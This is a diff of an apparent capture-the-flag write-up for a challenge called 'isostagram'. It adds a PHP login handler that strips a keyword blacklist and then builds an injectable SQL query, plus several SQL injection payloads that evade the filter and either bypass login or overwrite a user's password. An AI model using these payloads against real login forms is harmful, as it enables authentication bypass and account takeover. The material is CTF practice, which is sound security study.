@@ -1,18 +1,50 @@
 # isostagram
-sql injection
-
-
-php src
-```php
-$blacklist = array("union", "select", "where", "and", "or");
-$replace = array("", "", "", "", "");
-$username = str_ireplace($blacklist, $replace, $username);
-$password = str_ireplace($blacklist, $replace, $password);
-$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
-```
 `kita0421`
 
-payload
+- php src
+```php
+
+$host = 'isostagram_db';
+$dbuser = 'MYSQL_USER';
+$dbpassword = 'MYSQL_PASSWORD';
+$dbname = 'ctf_users';
+$link = mysqli_connect($host, $dbuser, $dbpassword, $dbname);
+
+$loginStatus = NULL;
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+if (isset($username) && isset($password)) {
+    error_log('POST: [' . $username . '] [' . $password . ']');
+    if ($link) {
+        $blacklist = array("union", "select", "where", "and", "or");
+        $replace = array("", "", "", "", "");
+        $username = str_ireplace($blacklist, $replace, $username);
+        $password = str_ireplace($blacklist, $replace, $password);
+        $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
+        $query = mysqli_query($link, $sql);
+        @$fetchs = mysqli_fetch_all($query, MYSQLI_ASSOC);
+        if (@count($fetchs) > 0) {
+            foreach ($fetchs as $fetch) {
+                if ($fetch["username"] === 'kita0421' && $fetch["password"] === $password) {
+                    $loginStatus = True;
+                    break;
+                }
+                $loginStatus = False;
+            }
+        } else {
+            $loginStatus = False;
+        }
+    } else {
+        $loginStatus = NULL;
+    }
+} else {
+    $loginStatus = NULL;
+}
+```
+
+
+# payload
 1. 
 ```SQL
 ' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--
@@ -21,4 +53,17 @@ payload
 2. 
 ```SQL
 1' OORR '1' = '1' limit 1; --
+```
+3. 
+```SQL
+' UORNION select '0','kita0421','1';--
+' UORNION select 'kita0421','1','0';--
+' UORNION select 'kita0421','1';--
+```
+4.
+```SQL
+1' UORNION sORelect 0,'kita0421','pw';--
+1' UORNION sORelect 'kita0421','pw',0;--
+1' UORNION sORelect 'kita0421',0,'pw';--
+1' UORNION sORelect 'pw','kita0421',0;--
 ```
